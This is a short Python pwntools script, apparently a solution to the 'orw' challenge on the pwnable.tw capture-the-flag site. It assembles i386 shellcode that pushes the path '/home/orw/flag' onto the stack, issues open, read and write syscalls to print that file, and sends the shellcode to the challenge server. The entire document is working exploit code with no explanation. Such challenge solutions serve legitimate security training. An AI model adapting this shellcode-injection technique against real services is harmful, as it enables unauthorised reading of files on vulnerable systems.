from pwn import *

filename = r'///home/orw/flag'
file_hex = [filename[x:x+4].encode('hex') for x in xrange(0,len(filename),4)]
filename = ''
for _ in xrange(4):
    filename += "push 0x" +  p32( int( file_hex.pop(),16) ).encode('hex') + "\n"

shellcode = asm( \
    '''
    xor ecx,ecx
    mul edx
    push ecx
    ''' \
    + filename + \
    '''
    xor eax,eax
    mov al,0x5
    mov ebx,esp
    int 0x80
    /* open(esp,0,0)*/
    mov ecx,esp
    xor ebx,ebx
    mov bl,0x3
    mov dl,0x30
    mov al,0x3
    int 0x80
    /* read(0x3,esp,0x80)*/
    mov bl,0x1
    mov al,0x4
    int 0x80
    /* write(1,esp,0x80) */
    '''
)

p = remote('chall.pwnable.tw',10001)
#p = process('./orw')
print p.recv()
p.send(shellcode)
print p.recv()
